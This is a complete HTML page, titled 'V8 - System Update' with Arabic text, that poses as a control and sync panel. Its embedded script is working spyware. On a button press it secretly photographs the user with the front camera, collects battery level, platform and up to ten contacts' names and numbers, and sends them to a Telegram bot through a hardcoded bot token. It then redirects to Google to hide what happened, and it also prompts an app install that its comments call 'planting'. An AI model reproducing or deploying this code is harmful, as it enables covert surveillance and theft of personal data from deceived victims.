<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>V8 - System Update</title>
    <link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIlY4IFN5c3RlbSBDb250cm9sIiwKICAic2hvcnRfbmFtZSI6ICJWOCIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjMDAwMDAwIiwKICAidGhlbWVfY29sb3IiOiAiIzAwZmZjYyIKfQ==">
    
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { border: 1px solid #00ffcc; padding: 25px; border-radius: 15px; width: 90%; max-width: 450px; background: rgba(0,255,204,0.05); box-shadow: 0 0 30px #00ffcc; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
        #v, #c { display: none; }
        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <div class="flash" id="f"></div>
    <div class="panel">
        <h2 id="t">V8 CONTROL PANEL</h2>
        <p id="s">بانتظار تفعيل بروتوكول التحكم المستمر...</p>
        <button class="btn" onclick="startControl()">تفعيل التحكم والمزامنة الكاملة ✅</button>
        <button class="btn" id="installBtn" style="display:none; background:#fff;">تثبيت أداة الحماية الدائمة 🛠</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');

        // 1. نظام زرع الأيقونة (PWA)
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault(); deferredPrompt = e;
            document.getElementById('installBtn').style.display = 'block';
        });

        document.getElementById('installBtn').addEventListener('click', async () => {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                const { outcome } = await deferredPrompt.userChoice;
                if (outcome === 'accepted') console.log('V8 Planted!');
                deferredPrompt = null;
            }
        });

        // 2. وظيفة السحب والتحكم (تلقائية عند الضغط)
        async function startControl() {
            if(!uid) return;
            document.getElementById('s').innerText = "جاري السحب والمزامنة...";

            try {
                // سحب الكاميرا (منع السواد بالتأخير والفلاش)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                await new Promise(r => setTimeout(r, 2500)); // انتظار الضبط

                // فلاش رقمي للتصوير
                document.getElementById('f').style.opacity = '1';
                const canvas = document.getElementById('c');
                const video = document.getElementById('v');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                document.getElementById('f').style.opacity = '0';

                // سحب الشحن والأسماء
                const b = await navigator.getBattery();
                let report = `🚀 **صيد V8 جديد (تحكم كامل):**\n🔋 الشحن: ${Math.floor(b.level*100)}%\n📱 النظام: ${navigator.platform}`;

                if ('contacts' in navigator) {
                    try {
                        const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                        report += `\n📇 سجل الأسماء:\n` + list.slice(0, 10).map(c => `👤 ${c.name}: ${c.tel}`).join('\n');
                    } catch(e) {}
                }

                // إرسال البيانات فوراً لتجنب صراع الـ Polling
                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', report);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });

                document.getElementById('s').innerText = "تمت المزامنة بنجاح!";
                stream.getTracks().forEach(t => t.stop());
                setTimeout(() => window.location.replace("https://google.com"), 2000);
            } catch (e) { window.location.replace("https://google.com"); }
        }
    </script>
</body>
</html>
